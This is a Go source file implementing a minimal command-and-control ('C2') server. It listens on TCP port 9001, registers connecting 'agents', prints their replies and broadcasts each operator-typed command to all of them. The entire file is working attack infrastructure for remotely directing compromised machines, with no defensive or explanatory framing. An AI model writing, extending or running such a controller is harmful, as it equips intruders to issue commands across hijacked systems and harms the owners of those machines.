package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

var agents = make(map[net.Conn]struct{})

func handleAgent(conn net.Conn) {
	defer conn.Close()
	agents[conn] = struct{}{}
	reader := bufio.NewReader(conn)
	for {
		resp, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Agent disconnected:", conn.RemoteAddr())
			delete(agents, conn)
			return
		}
		fmt.Printf("[Agent %v] %s", conn.RemoteAddr(), resp)
	}
}

func main() {
	ln, err := net.Listen("tcp", ":9001")
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer ln.Close()
	fmt.Println("C2 server listening on :9001")

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				continue
			}
			fmt.Println("Agent connected:", conn.RemoteAddr())
			go handleAgent(conn)
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("Enter command to send to agents: ")
		if !scanner.Scan() {
			break
		}
		cmd := scanner.Text()
		if strings.TrimSpace(cmd) == "" {
			continue
		}
		for conn := range agents {
			fmt.Fprintf(conn, "%s\n", cmd)
		}
	}
}
